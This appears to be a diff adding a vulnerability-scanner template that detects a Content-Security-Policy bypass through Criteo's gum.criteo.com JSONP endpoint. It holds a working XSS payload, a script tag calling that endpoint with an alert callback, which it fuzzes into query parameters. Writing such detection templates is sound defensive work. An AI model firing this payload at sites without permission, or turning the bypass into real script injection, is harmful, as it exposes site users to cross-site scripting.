@@ -1,0 +1,55 @@
+id: criteo-gum-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Criteo Gum
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,criteo-gum
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "criteo.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: criteo_gum_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://gum.criteo.com/sync?c=123&r=2&a=1&j=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "criteo_gum_csp_xss == true"
+# digest: 4b0a004830460221009e00a9e8f93b6ec3d7ededabc5f2789dd4e870566e8947e638006925cc10d0e4022100859f22251098bc5aa943cd613c8b85cdbf524ec024a2d6a66e7da4d6c058eecc:922c64590222798bb761d5b6d8e72950
